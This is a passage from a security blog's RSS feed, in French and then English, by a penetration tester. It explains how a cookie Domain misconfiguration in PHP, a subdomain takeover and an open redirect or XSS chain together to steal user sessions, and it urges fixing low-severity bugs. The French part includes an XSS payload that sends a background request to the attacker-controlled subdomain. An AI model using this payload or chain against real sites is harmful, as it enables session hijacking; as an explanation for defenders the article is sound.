<p>C&#8217;est une bonne remarque. Cela est utile dans le cas où l&#8217;application vulnérable à la redirection d&#8217;URL est une application utilisée tous les jours par les utilisateurs et donc dans laquelle ils ont confiance alors que le sous-domaine compromis, ils ne l&#8217;ont peut-être jamais vu, ça ne leur parlera pas et cela leur semblera suspect. Imaginez que vous recevez une URL du type : <code>http://test-app.environment-23.staging.pipe-2.dev.axays.fr</code> ? Ca va tout de suite vous sembler rocambolesque et peut être que vous ne verrez même pas le domaine tellement le sous-domaine est long.</p>
<p>Une redirection d&#8217;URL peut être rare et ne pas affecter toutes les applications, il faut déjà que l&#8217;application ait un paramètre qui manipule une URL ou un chemin que l&#8217;on puisse détourner. Alors qu&#8217;une XSS sera un peu plus générique et à plus de chance de toucher un large panel d&#8217;applications.</p>
<p>Si l&#8217;attaquant trouve une XSS réfléchie, il pourra utiliser une charge utile similaire :</p>
<pre><code class="language-js">&lt;script&gt;
  fetch(&#039;https://support.axays.fr&#039;, {
  method: &#039;POST&#039;,
  mode: &#039;no-cors&#039;,
  body: &#039;noraj&#039;
  });
&lt;/script&gt;</code></pre>
<p>Trois remarques à ce sujet :</p>
<ol>
<li>Ici le navigateur du client effectuera une requête vers le sous-domaine compromis en tâche de fond, il ne sera pas redirigé, cela sera donc plus discret. Ce qui donne un avantage à la méthode XSS plutôt qu&#8217;à la redirection d&#8217;URL.</li>
<li>On peut en profiter pour faire une requête POST et passer tout un tas d&#8217;informations sur l&#8217;utilisateur (IP, nom d&#8217;utilisateur, empreinte du navigateur, etc.) afin de mieux identifier la victime dont on aura besoin pour cibler les sessions intéressantes. Ces infos ne peuvent pas être récupérées avec la redirection d&#8217;URL, car il n&#8217;y a pas d’exécution de code et l&#8217;utilisation de la méthode GET limite la taille de l&#8217;URL.</li>
<li>&quot;Mais si on a une XSS pourquoi on ne vole pas les cookies avec document.cookie directement ?&quot;, en général l&#8217;application aura positionné l&#8217;attribut <code>httpOnly</code> sur le cookie de session qui empêche JavaScript de récupérer les cookies.</li>
</ol>
<p>La redirection d&#8217;URL et la XSS réfléchie partagent un handicap commun, le besoin d&#8217;une interaction utilisateur pour aller cliquer sur une URL malveillante. Le mieux pour l&#8217;attaquant serait de s&#8217;en dispenser, en utilisant une XSS stockée qui utilisera le même mécanisme que la XSS réfléchie, mais la requête vers le sous-domaine compromis sera effectuée automatiquement lorsque l&#8217;utilisateur accédera à la page vulnérable à la XSS.</p>
<h2>Scénario d&#8217;attaque</h2>
<p>Si je résume le cheminement complet de l&#8217;attaque en utilisant 3 vulnérabilités parmi celles étudiées précédemment cela donne les étapes suivantes :</p>
<ul>
<li>Utilisation de l&#8217;attribut <code>Domain</code> sur le cookie de session positionné implicitement et par défaut à cause de l&#8217;utilisation de l&#8217;option <code>session.cookie_domain</code> dans la configuration de PHP ;</li>
<li>Prise de contrôle d&#8217;un sous-domaine en jachère dont l&#8217;entrée DNS pointe toujours vers une ressource infonuagique non utilisée ;</li>
<li>Forçage de l&#8217;utilisateur à visiter le sous-domaine compromis :
<ul>
<li>Option n°1 : Redirection d&#8217;URL ou XSS réfléchie combinée à une technique d&#8217;ingénierie sociale</li>
<li>Option n°2 : XSS stockée</li>
</ul>
</li>
</ul>
<p>Et si je résume le résumé et que j&#8217;utilise une pléthore d&#8217;anglicismes, cela donne :</p>
<p><code>Domain</code> cookie flag + subdomain takeover + ((open-redirect / reflected XSS + social engineering) ou (stored XSS))</p>
<p>Et si je remplace certains mots par des frimousses (<em>emoji</em>) &#x1f92f; afin d&#8217;arriver à un cyber-rébus :</p>
<p><code>Domain</code> &#x1f36a; &#x1f6a9; &#x2795; subdomain &#x1f977; &#x2795; ((&#x1f450;-&#x23e9; / &#x1fa9e; &#x1f1fd; &#x1f1f8; &#x1f1f8; &#x2795; &#x1f973; &#x2699;&#xfe0f;) ou (&#x1f4e6; &#x1f1fd; &#x1f1f8; &#x1f1f8;))</p>
<h2>Angle mort et moralité</h2>
<p>Certaines entreprises bénéficiaires de tests d&#8217;intrusion peuvent avoir tendance à corriger rapidement ou dans un temps raisonnable les vulnérabilités dont la sévérité est <em>Haute</em> ou <em>Critique</em>, mais mettre très longtemps (ex : plus d&#8217;un an) à corriger les vulnérabilités dont la sévérité est <em>Moyenne</em> ou <em>Faible</em>, voir ne jamais les corriger du tout, car un décideur peut juger, certainement à tort, que le risque est acceptable.</p>
<p>Il est vrai qu&#8217;individuellement prise, on pourrait être tenté de penser les assertions suivantes aux sujets de ces vulnérabilités :</p>
<ul>
<li>&quot;C&#8217;est juste une erreur de configuration&quot;</li>
<li>&quot;Les sous-domaines nous appartiennent, un attaquant ne pourra rien faire&quot;</li>
<li>&quot;Il faudrait déjà qu&#8217;un attaquant contrôle l&#8217;un de nos sous-domaines or nous avons mis des WAF sur chaque application&quot;</li>
<li>&quot;De toute façon les cookies sont protégés contre les XSS&quot;</li>
<li>&quot;L&#8217;attaquant ne pourra rien faire avec une redirection d&#8217;URL, nous avons mis en place un filtrage sur nos domaines&quot;</li>
<li>&quot;Le SOC va détecter les connexions vers des domaines tiers&quot;</li>
<li>etc.</li>
</ul>
<p>Inutile de reprendre ces excuses une par une, si vous avez lu assidûment cet article, vous êtes normalement déjà convaincu que l&#8217;on peut contourner chacune d&#8217;entre elles.</p>
<p>Comme nous l&#8217;avons vu tout au long de cet article, une fois combinées, toutes ces vulnérabilités &quot;à faible risque&quot; constituent un risque sérieux ayant un impact réel et important.</p>
<p>De manière générale, beaucoup de vulnérabilités dites faibles ne permettent pas d’avoir un impact direct sur la cible individuellement, mais peuvent devenir redoutables lorsqu&#8217;elles sont enchaînées astucieusement. C&#8217;est pourquoi, malgré le fait qu&#8217;il n&#8217;y ait pas d&#8217;urgence à les corriger, il faut tout de même les prendre au sérieux et finir par les corriger.</p>
<p>Nous venons de voir que comme l&#8217;impact de ces vulnérabilités parait peu clair, improbable ou anecdotique, certaines personnes peuvent choisir de négliger leur correction à l&#8217;issue d&#8217;un test d&#8217;intrusion. Mais cela peut être pire dans le cadre d&#8217;un programme de chasse aux bugs (<em>bug bounty</em>).</p>
<p>En effet, nombreuses sont les plateformes de chasse aux bugs (<em>bug bounty</em>) à exclure les vulnérabilités les plus faibles afin d&#8217;éviter à leurs clients d&#8217;être submergés par des vagues de rapports sans impact dont les vulnérabilités rapportées sont inexploitables. On constate souvent une surenchère de zèle quant à l’exhaustivité des types de vulnérabilités à ajouter à la liste des bugs exclus du périmètre (<em>out of scope</em>). Voici ce que l&#8217;on peut voir dans des listes d&#8217;exclusion classiques :</p>
<ul>
<li>XSS réfléchie : exclue si aucun impact démontré. D&#8217;ailleurs, les XSS réfléchies sont exclues des scripts d&#8217;exploitation admissible sur <a href="https://www.exploit-db.com/submit">Exploit-DB</a> si elles n&#8217;ont pas un numéro de CVE attribué.</li>
<li>Redirection arbitraire d&#8217;URL : il n&#8217;est pas rare de voir ce type de bug exclu sans condition.</li>
<li>Erreur de configuration : exclue si aucun impact n&#8217;est démontré et qu&#8217;une preuve de concept n&#8217;est pas fournie.</li>
<li>Prise de contrôle de sous-domaine : exclue si aucun impact n&#8217;est démontré et qu&#8217;une preuve de concept n&#8217;est pas fournie.</li>
<li>Attributs de cookies mal configurés : quasiment toujours exclus. Cela vise en particulier les attributs <code>HttpOnly</code> et <code>Secure</code> car ils n&#8217;ont d&#8217;importances que sur les cookies de session et pas sur des cookies contenant des informations fonctionnelles comme la langue préférée. Beaucoup de débutants ne comprenant pas bien le fonctionnement ou l&#8217;impact et ont tendance à remonter leur absence à tort, ce qui pousse les clients et les plateformes à les exclure des types de bugs éligibles. Les attributs <code>Domain</code> et <code>HostOnly</code> se retrouvent donc exclus en dommage collatéral.</li>
<li>Manquements aux bonnes pratiques (de sécurité) : quasiment toujours exclus. Raison identique au point précédent.</li>
</ul>
<p>Ces listes d&#8217;exclusion toujours plus longues au sein des programmes de chasse aux bugs découragent les chasseurs de bugs à remonter de tels problèmes de sécurité alors que dans certains cas ceux-ci peuvent avoir un impact important. Les chercheurs expérimentés sont alors obligés de combiner un grand nombre de ces vulnérabilités afin d&#8217;être en mesure de prouver la criticité d&#8217;un scénario utilisant ces vulnérabilités qui sont hors périmètre.</p>
<p>C&#8217;est une chose de jouer avec le feu en acceptant un risque plutôt que de corriger une vulnérabilité, mais s&#8217;en est une autre de ne pas avoir conscience que la vulnérabilité existe, car elle n&#8217;a pas été remontée faute de marginalisation.</p>
<p>Moralité ? Dans le doute, il vaut mieux corriger.</p>
<h2>A propos de l&#8217;auteur</h2>
<p>Article écrit par Alexandre ZANNI alias <a href="https://pwn.by/noraj/">noraj</a>, Ingénieur en Test d&#8217;Intrusion chez <a href="https://www.acceis.fr/">ACCEIS</a>.</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/transformer-des-vulnerabilites-p3-p4-p5-en-p1/">Transformer des vulnérabilités P3 P4 P5 en P1</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Transform P3 P4 P5 vulnerabilities to P1</title>
		<link>https://www.acceis.fr/transform-p3-p4-p5-vulnerabilities-to-p1/</link>
		
		<dc:creator><![CDATA[Alexandre Zanni]]></dc:creator>
		<pubDate>Tue, 04 Oct 2022 07:43:38 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[Outils et méthodes]]></category>
		<category><![CDATA[attaque]]></category>
		<category><![CDATA[cookie]]></category>
		<category><![CDATA[méthodologie]]></category>
		<category><![CDATA[open-redirect]]></category>
		<category><![CDATA[scénario]]></category>
		<category><![CDATA[sous-domaine]]></category>
		<category><![CDATA[XSS]]></category>
		<guid isPermaLink="false">https://www.acceis.fr/?p=2594</guid>

					<description><![CDATA[<p>Transform vulnerabilities to or how to steal user sessions by chaining low risk vulnerabilities Note: This article is also available in french &#x1f1eb;&#x1f1f7;. This article presents an attack scenario that allows chaining together vulnerabilities, which individually have a limited impact, but when combined become very dangerous. Below are the vulnerabilities used (in brackets the [Vulnerability [&#8230;]</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/transform-p3-p4-p5-vulnerabilities-to-p1/">Transform P3 P4 P5 vulnerabilities to P1</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></description>
										<content:encoded><![CDATA[<p>Transform <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P3.png" alt="p3" /> <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P4.png" alt="p4" /> <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P5.png" alt="p5" /> vulnerabilities to <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P1.png" alt="p1" /> or how to steal user sessions by chaining low risk vulnerabilities</p>
<p>Note: This article is also available <a href="https://www.acceis.fr/transformer-des-vulnerabilites-p3-p4-p5-en-p1/" title="article: french version">in french</a> &#x1f1eb;&#x1f1f7;.</p>
<hr />
<p>This article presents an attack scenario that allows chaining together vulnerabilities, which individually have a limited impact, but when combined become very dangerous.</p>
<p>Below are the vulnerabilities used (in brackets the [<em>Vulnerability Rating Taxonomy</em> (VRT)] category (<a href="https://bugcrowd.com/vulnerability-rating-taxonomy">https://bugcrowd.com/vulnerability-rating-taxonomy</a>) and the severity):</p>
<ul>
<li>A domain cookie attribute <strong>misconfiguration</strong> (<em>Server Security Misconfiguration</em> &#x27a1;&#xfe0f; <em>Cookie scoped to parent domain</em>, <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P5.png" alt="P5" />)</li>
<li>A <strong>subdomain takeover</strong> (<em>Server Security Misconfiguration</em> &#x27a1;&#xfe0f; <em>Misconfigured DNS</em> &#x27a1;&#xfe0f; <em>Basic Subdomain Takeover</em>, <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P3.png" alt="P3" />)</li>
<li>An <strong>open-redirect</strong> (<em>Unvalidated Redirects and Forwards</em> &#x27a1;&#xfe0f; <em>Open Redirect</em> &#x27a1;&#xfe0f; <em>GET-Based</em> (<img src="https://www.acceis.fr/voy_content/uploads/2022/07/P4.png" alt="P4" />), <em>POST-Based</em> (<img src="https://www.acceis.fr/voy_content/uploads/2022/07/P5.png" alt="P5" />) or <em>Header-Based</em> (<img src="https://www.acceis.fr/voy_content/uploads/2022/07/P5.png" alt="P5" />))</li>
<li>A <strong>stored XSS</strong> (<em>Cross-Site Scripting (XSS)</em> &#x27a1;&#xfe0f; <em>Stored</em> (<img src="https://www.acceis.fr/voy_content/uploads/2022/07/P2.png" alt="P2" /> to <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P4.png" alt="P4" /> as per required privileges)) for <em>zero click</em> exploitation or a <strong>reflected XSS</strong> (<em>Cross-Site Scripting (XSS)</em> &#x27a1;&#xfe0f; <em>Reflected</em> &#x27a1;&#xfe0f; <em>Non-Self</em>, <img src="https://www.acceis.fr/voy_content/uploads/2022/07/P3.png" alt="P3" />) if user interaction is acceptable.</li>
</ul>
<p><strong>Note</strong>: in this article, I will use the notation <strong>UA</strong> as a diminutive of <em>User-Agent</em> which refers to any HTTP client (web browser, bot, crawler, etc).</p>
<h2>Misconfiguration</h2>
<p>Cookies &#x1f36a; have a <code>Domain</code> attribute defining the scope of them, i.e. on which URLs the cookies should be sent.</p>
<p>The <a href="https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Set-Cookie#domaindomain-value">Set-Cookie</a> and <a href="https://developer.mozilla.org/fr/docs/Web/HTTP/Cookies#port%C3%A9e_des_cookies">HTTP cookies</a> pages of the MDN summarize the behavior of this attribute for the <code>Set-Cookie</code> header as specified in <a href="https://datatracker.ietf.org/doc/html/rfc6265">RFC 6265</a>.</p>
<p>Hold on to your hats, this is not as simple as it sounds.</p>
<p>From a high-level perspective, if the <code>Domain</code> attribute is omitted from the cookie in the <code>Set-Cookie</code> header, then the UA should only use this cookie for the host of the current document URL. So subdomains will not be included. For example, if the URL is <a href="http://example.org/blog">http://example.org/blog</a>, the cookie will be valid for <code>example.org</code> but not for <code>www.example.org</code> or <code>payment.dev.example.org</code> or any other subdomains or domains.</p>
<pre><code class="language-plaintext">Set-Cookie: noraj=yet%20another%20secret</code></pre>
<p>If the <code>Domain</code> attribute is present for the cookie in the <code>Set-Cookie</code> header, then all subdomains of the specified domain will be accepted. For example, if <code>Domain=noraj.test</code> then the cookie will be sent for <code>noraj.test</code> but also <code>www.noraj.test</code>, <code>sub.noraj.test</code>, <code>payment.dev.noraj.test</code>, but not for other domains.</p>
<pre><code class="language-plaintext">Set-Cookie: noraj=yet%20another%20secret; Domain=noraj.test</code></pre>
<p>But if we want to go into details, what is really going on on the UA side?</p>
<p>Indeed, if specifying the <code>Domain</code> attribute is optional in the <code>Set-Cookie</code> header, a cookie stored in the UA must have a <code>Domain</code> attribute to be valid and usable. The RFC warns that if the <code>Domain</code> attribute is not present for a cookie from the <em>Cookie Store</em> then the behavior will be undefined, but the UA is strongly advised to ignore it completely.</p>
<blockquote>
<p>If the attribute-value is empty, the behavior is undefined. However, the user agent SHOULD ignore the cookie-av entirely.</p>
</blockquote>
<p>One can guess that the UA will always store a cookie with a <code>Domain</code> attribute, whether the <code>Set-cookie</code> header has specified one or not. This is what we saw before, either it is specified directly or it is not and then it is extracted from the URL.</p>
<p>However, with the current knowledge, there seems to be a problem. If no domain is specified in the <code>Set-Cookie</code> header, the domain will be extracted from the URL and used in the cookie stored by the UA (e.g. <code>example.org</code>), and subdomains will not be allowed. On the other hand, if a domain (e.g. <code>example.org</code>) is specified in the <code>Set-Cookie</code> header, the domain used in the cookie stored by the UA will be the same (<code>example.org</code>) but, this time, subdomains will be allowed. How can the UA distinguish between two different behaviors if the information stored is the same?</p>
<p>The answer can be found by reading the RFC.</p>
<blockquote>
<ul>
<li>
<p>If the domain-attribute is non-empty:</p>
<ul>
<li>
<p>If the canonicalized request-host does not domain-match the domain-attribute:</p>
</li>
<li>
<p>Ignore the cookie entirely and abort these steps.</p>
</li>
<li>
<p>Otherwise:</p>
</li>
<li>
<p>Set the cookie&#8217;s host-only-flag to false.</p>
</li>
<li>
<p>Set the cookie&#8217;s domain to the domain-attribute.</p>
</li>
</ul>
</li>
<li>Otherwise:
<ul>
<li>Set the cookie&#8217;s host-only-flag to true.</li>
<li>Set the cookie&#8217;s domain to the canonicalized request-host.</li>
</ul>
</li>
</ul>
</blockquote>
<p>The answer lies in the use of another cookie attribute: <a href="https://developer.mozilla.org/fr/docs/Mozilla/Add-ons/WebExtensions/API/cookies/Cookie#hostonly">hostOnly</a>, which will play exactly the role described above.</p>
<p>Let&#8217;s do a naive test in PHP.</p>
<p>First, let&#8217;s declare a session cookie and a custom cookie without specifying a <code>Domain</code> attribute.</p>
<pre><code class="language-php">&lt;?php
  echo &#039;&lt;h1&gt;noraj - OK&lt;/h1&gt;&#039;;
  session_start(); // PHPSESSID
  setcookie(&#039;noraj&#039;, &#039;yet another secret&#039;);
?&gt;</code></pre>
<p>Note: no domain is specified, either directly as a function parameter, or via the <code>php.ini</code> configuration, or via an <code>ini_set</code> directive, or via a command line option, or in any other way.</p>
<p>You can check with curl that no <code>Domain</code> attribute is set in the <code>Set-Cookie</code> headers:</p>
<pre><code class="language-plaintext">$ curl http://noraj.test:8080/ -v
*   Trying 127.0.0.2:8080...
* Connected to noraj.test (127.0.0.2) port 8080 (#0)
> GET / HTTP/1.1
> Host: noraj.test:8080
> User-Agent: curl/7.83.1
> Accept: */*
>
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Host: noraj.test:8080
&lt; Date: Tue, 28 Jun 2022 12:31:32 GMT
&lt; Connection: close
&lt; X-Powered-By: PHP/8.1.7
&lt; Set-Cookie: PHPSESSID=n7ktvgv47t55ndlfrc1v5uaoin; path=/
&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
&lt; Cache-Control: no-store, no-cache, must-revalidate
&lt; Pragma: no-cache
&lt; Set-Cookie: noraj=yet%20another%20secret
&lt; Content-type: text/html; charset=UTF-8
&lt;
* Closing connection 0
&lt;h1&gt;noraj - OK&lt;/h1&gt;</code></pre>
<p>In the <code>Storage</code> tab, in the Firefox developer console (version 101.0.1), we find the cookies.</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/FF_no_domain.png" alt="" /></p>
<p>These cookies do have the <code>Domain</code> attribute equal to the host of the requested URL, because no <code>Domain</code> attribute was present in the <code>Set-Cookie</code> header. By default, other attributes are displayed like <code>Path</code>, <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code>, etc. The <code>HostOnly</code> attribute is one of the only ones not displayed by default. However, it is possible to add the column corresponding to this attribute.</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/FF_no_domain2.png" alt="" /></p>
<p>We can see that with the <code>HostOnly</code> attribute set to <code>true</code>, cookies will not be sent to subdomains.</p>
<p>Note: Chromium (version 103.0.5060.53) does not allow viewing the <code>HostOnly</code> attribute. To access it, you would have to create an extension that uses the <a href="https://developer.chrome.com/docs/extensions/reference/cookies/">chrome.cookies</a> API (this API is not available from the JavaScript console), which is not practical at all, hence the use of Firefox.</p>
<p>Another web server will serve the subdomains <code>sub.noraj.test</code> and <code>www.noraj.test</code>, contacting them with the same browser, the cookies will not be sent, so these sites will not have access to them.</p>
<p>If we modify the code slightly so that the server specifies a <code>Domain</code> attribute for the <code>Set-Cookie</code> header, we will be able to observe the other case.</p>
<pre><code class="language-php">&lt;?php
  echo &#039;&lt;h1&gt;noraj - OK&lt;/h1&gt;&#039;;
  session_start([&#039;cookie_domain&#039; =&gt; &#039;noraj.test&#039;]); // PHPSESSID
  setcookie(&#039;noraj&#039;, &#039;yet another secret&#039;, [&#039;domain&#039; =&gt; &#039;noraj.test&#039;]);
?&gt;</code></pre>
<p>A check with curl allows us to see the attribute set in the server response.</p>
<pre><code class="language-plaintext">$ curl http://noraj.test:8080/ -v
*   Trying 127.0.0.2:8080...
* Connected to noraj.test (127.0.0.2) port 8080 (#0)
> GET / HTTP/1.1
> Host: noraj.test:8080
> User-Agent: curl/7.83.1
> Accept: */*
>
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Host: noraj.test:8080
&lt; Date: Tue, 28 Jun 2022 13:00:16 GMT
&lt; Connection: close
&lt; X-Powered-By: PHP/8.1.7
&lt; Set-Cookie: PHPSESSID=q5kkcsmgpebi6g57p8kd6clh83; path=/; domain=noraj.test
&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
&lt; Cache-Control: no-store, no-cache, must-revalidate
&lt; Pragma: no-cache
&lt; Set-Cookie: noraj=yet%20another%20secret; domain=noraj.test
&lt; Content-type: text/html; charset=UTF-8
&lt;
* Closing connection 0
&lt;h1&gt;noraj - OK&lt;/h1</code></pre>
<p>Note: for experimentation in the web browser, be sure to make a request that bypasses the cache (<kdb>CTRL</kdb> + <kdb>F5</kdb>) as well as purge the stored cookies between each request.</p>
<p>Now, in Firefox, we see differences, this time the <code>HostOnly</code> attribute is set to <code>false</code>, cookies should be sent to subdomains.</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/FF_domain.png" alt="" /></p>
<p>We also note that the <code>Domain</code> attribute is now <code>.noraj.test</code> and no longer <code>noraj.test</code>.</p>
<p>When this prefixed point is present in the <code>Set-Cookie</code> header, it is a remnant of the past that does not matter, it dates from an old version of the RFC and some applications choose to provide it in violation of the RFC. There is a note about this in RFC 6265 for the <code>Set-Cookie</code> header.</p>
<blockquote>
<p>Note that a leading %x2E (&quot;.&quot;), if present,<br />
is ignored even though that character is not permitted,</p>
</blockquote>
<p>On the other hand, when this prefixed point is present, the AU has the role of removing it.</p>
<blockquote>
<p>If the first character of the attribute-value string is %x2E (&quot;.&quot;):</p>
<ul>
<li>Let cookie-domain be the attribute-value without the leading %x2E (&quot;.&quot;) character.</li>
</ul>
<p>Otherwise:</p>
<ul>
<li>Let cookie-domain be the entire attribute-value.</li>
</ul>
</blockquote>
<p>So I&#8217;m personally surprised that Firefox and Chromium have this item positioned in the <em>Cookie Store</em>. This really seems to be due to the deprecated behavior of RFC 2965 which is obsolete.</p>
<blockquote>
<p><code>Domain=value</code></p>
<p>OPTIONAL. The value of the Domain attribute specifies the domain<br />
for which the cookie is valid.  If an explicitly specified value<br />
does not start with a dot, the user agent supplies a leading dot.</p>
</blockquote>
<p>Let&#8217;s close this parenthesis on the <em>leading dot</em> which highlights the gap in the implementation of the RFC by these leading web browsers.</p>
<p>With these cookies having the attribute <code>HostOnly = false</code>, which can be qualified as <em>Cross-domain</em>, if one goes now to a subdomain like <code>sub.noraj.test</code>, the cookies have been transmitted to it.</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/FF_domain_on_sub.png" alt="" /></p>
<p>Now, let&#8217;s return to the original case where we don&#8217;t provide a <code>Domain</code> attribute as an argument to the <code>session_start()</code> and <code>setcookie()</code> functions. However, this time we will specify a domain with the <a href="https://www.php.net/manual/en/session.configuration.php#ini.session.cookie-domain">session.cookie_domain</a> configuration option of the PHP configuration.</p>
<p>Note: This option will more typically be specified via the <code>php.ini</code> configuration file in production, but here for the purpose of the proof of concept (<em>PoC</em>), I specified it directly in the code using the <code>ini_set()</code> function.</p>
<pre><code class="language-php">&lt;?php
  ini_set(&#039;session.cookie_domain&#039;, &#039;noraj.test&#039; ); // or in php.ini
  echo &#039;&lt;h1&gt;noraj - OK&lt;/h1&gt;&#039;;
  session_start(); // PHPSESSID
  setcookie(&#039;noraj&#039;, &#039;yet another secret&#039;);
?&gt;</code></pre>
<p>It&#8217;s time to guess what the observed behavior will be before I spoil it to you.</p>
<p>With curl:</p>
<pre><code class="language-plaintext">$ curl http://noraj.test:8080/ -v
*   Trying 127.0.0.2:8080...
* Connected to noraj.test (127.0.0.2) port 8080 (#0)
> GET / HTTP/1.1
> Host: noraj.test:8080
> User-Agent: curl/7.83.1
> Accept: */*
>
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Host: noraj.test:8080
&lt; Date: Tue, 28 Jun 2022 13:50:58 GMT
&lt; Connection: close
&lt; X-Powered-By: PHP/8.1.7
&lt; Set-Cookie: PHPSESSID=bpp2khdkaii84b3edoibit28dr; path=/; domain=noraj.test
&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
&lt; Cache-Control: no-store, no-cache, must-revalidate
&lt; Pragma: no-cache
&lt; Set-Cookie: noraj=yet%20another%20secret
&lt; Content-type: text/html; charset=UTF-8
&lt;
* Closing connection 0
&lt;h1&gt;noraj - OK&lt;/h1&gt;</code></pre>
<p>With Firefox, on the main domain:</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/FF_domain2.png" alt="" /></p>
<p>With Firefox, on a subdomain:</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/FF_domain_on_sub2.png" alt="" /></p>
<p><code>session.cookie_domain</code> has the effect of setting a default domain to specify in the session cookie. This only applies to the session cookie handled by PHP, <code>PHPSESSID</code>, so a domain will be set even if no argument to the <code>session_start()</code> function is specified.</p>
<p>The trap is there, and it has several pernicious effects.</p>
<p>Indeed, we have seen that using the <code>Domain</code> attribute is dangerous, because it allows the browser to send cookies to all subdomains. But where the various cookie handling functions allow the domain to be specified explicitly, voluntarily, on a case-by-case basis; the use of <code>session.cookie_domain</code> makes this behavior implicit, by default, and potentially unintended. The behavior of the <code>Domain</code> attribute is not well known to the public, the documentation on it remains rather superficial and approximate or even erroneous, and it is a false friend topic: it looks simple on the surface, but turns out to have a rather subtle complexity. The best way to understand it is to read RFC 6265. The understanding of the mechanism is made all the more difficult by the fact that the official PHP documentation is very succinct and easily mixes up what is related to HTTP and what is related to PHP. There are also StackOverflow posts where the accepted answer suggests using <code>session.cookie_domain</code> in order to increase security, the author of this answer thinks that by default if no value is specified the cookie would accept all domains and that specifying a domain would therefore reduce this. Of course this answer is wrong and is even the exact opposite of reality. So it is not easy for a volunteer developer to get the right information on the subject without reading the RFC.</p>
<p>Another insidious effect of using <code>session.cookie_domain</code> in <code>php.ini</code> is that it is hard to tell.<br />
On an operating system like ArchLinux, there is only one version of PHP available in the official repositories (well, there are two: PHP 8.1 and PHP 7.4, but 7.4 is installed as <code>php7</code> so there is no ambiguity) and only one configuration file (<code>/etc/php/php. ini</code>) but for a distribution like Ubuntu it is possible to have a large number of PHP versions installed in parallel (e.g. <code>/etc/php/{5.6, 7.0, 7.1, 7.2, 7.3, 7.4, 8.0, 8.1}/</code>) and then have a dedicated <code>php.ini</code> configuration file for each application or usage (e.g. <code class="kb-btn">/etc/php/8.1/{apache2,cli,fpm}</code>). It can therefore sometimes be difficult to identify the correct configuration file used by the application. Especially since this configuration change in <code>php.ini</code> will not be visible during a code audit or by a <em>linter</em> during development as this file is not part of the project. However, it is possible to see this during a configuration audit, a penetration test or by observing the actual configuration with <code>phpinfo()</code>.</p>
<p>In summary, using the <code>session.cookie_domain</code> configuration option in PHP or any other equivalent to define a domain for cookies and thus allow session cookies to be sent to all subdomains is dangerous. If an attacker gains control of a subdomain, he can then steal and spoof user sessions from the root domain application or other subdomains.</p>
<h2>Subdomain takeover</h2>
<p>We have already seen the danger of the <code>domain</code> attribute of cookies, but how to take control of a subdomain in order to steal them?</p>
<p>Let&#8217;s imagine a company having as main domain <code>axays.fr</code> and having the following services:</p>
<ul>
<li>blog: <code>blog.axays.fr</code></li>
<li>outil management solution: <code>support.axays.fr</code></li>
<li>wiki: <code>wiki.axays.fr</code></li>
<li>calendar : <code>cal.axays.fr</code></li>
</ul>
<p>But one day, the company decides to migrate its ticket management tool. They want to move from MegaSoft to GigaSoft, but to make the transition smoothly and to give themselves time to correct the bugs, the company will keep both tools in parallel during a transitional phase before removing MegaSoft. The company is therefore in the following situation:</p>
<ul>
<li>MegaSoft : <code>support.axays.fr</code></li>
<li>GigaSoft : <code>aide.axays.fr</code></li>
</ul>
<p>The migration goes smoothly, GigaSoft works perfectly, so the company decides to remove MegaSoft: it removes the corresponding cloud virtual machine. However, the company forgot to delete the DNS entry <code>support.axays.com</code>. So what? Is it serious? Well, yes!</p>
<p>Indeed, the DNS entry of the company&#8217;s subdomain is an alias pointing to a subdomain of the hosting company which points to the cloud resource:</p>
<pre><code class="language-plaintext">support.axays.fr CNAME axays-support.monsuperhebergeur.fr.</code></pre>
<p>However, a number of hosting or online service providers allow users to reserve any resource as long as it is available. By removing the virtual machine or hosting space, the company has freed up the namespace <code>axays-support.myhosting.com</code> and now everyone is free to reserve it.</p>
<p>An attacker can then reserve the <code>axays-support</code> hosting space with the same provider in order to obtain the <code>axays-support.myhost.com</code> namespace and host his malicious application there. Since the DNS entry <code>support.axays.co.uk</code> is always configured to point to it, victims visiting <a href="http://support.axays.fr">http://support.axays.fr</a> will send their session cookies to an application run by a malicious actor, since <code>support.axays.co.uk</code> is indeed a subdomain of <code>axays.co.uk</code> and the cookie was configured with <code>Domain=axays.co.uk</code> (so <code>HostOnly=false</code>).</p>
<p>In short, if a company&#8217;s subdomain is no longer used, but continues to point to a third-party cloud resource, there is a risk of a subdomain takeover.</p>
<p>There is also the <a href="https://github.com/edoverflow/can-i-take-over-xyz">Can I take over XYZ?</a> project which lists the <em>cloud</em> services whose subdomains can be taken over.</p>
<blockquote>
<p>A list of services and how to claim (sub)domains with dangling DNS records.</p>
</blockquote>
<p>Not all are vulnerable and some are conditionally vulnerable. In the batch, we note in particular the presence of widely used services: WordPress, AWS S3 Bucket, Microsoft Azure.</p>
<h2>Forcing the user to fall into the trap</h2>
<p>Combining the first two vulnerabilities, it&#8217;s clear how an attacker can steal users&#8217; sessions, but he&#8217;s certainly not going to wait for users to stumble upon the malicious URL by accident.</p>
<p>How to force a user to go to <a href="http://sous-domaine-compromis.client.com">http://sous-domaine-compromis.client.com</a>?</p>
